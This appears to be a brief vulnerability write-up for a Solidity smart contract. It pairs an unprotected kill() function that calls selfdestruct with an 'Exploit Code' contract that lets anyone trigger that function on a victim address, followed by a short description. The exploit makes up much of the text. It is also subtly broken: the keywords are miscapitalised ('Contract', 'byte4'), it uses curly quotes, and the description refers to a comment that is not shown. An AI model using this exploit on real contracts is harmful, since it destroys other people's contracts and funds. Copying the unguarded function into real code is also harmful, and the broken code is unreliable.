## Vulnerable Code

```javascript
function kill() {
    selfdestruct(creator);
  }
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“kill()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look at the commant of '//Vulnerable position',the statement is not protected by any way.so if an malicious contract call the method -'kill'.In this situation, the victim contract can be destruct by any macious contract easily 
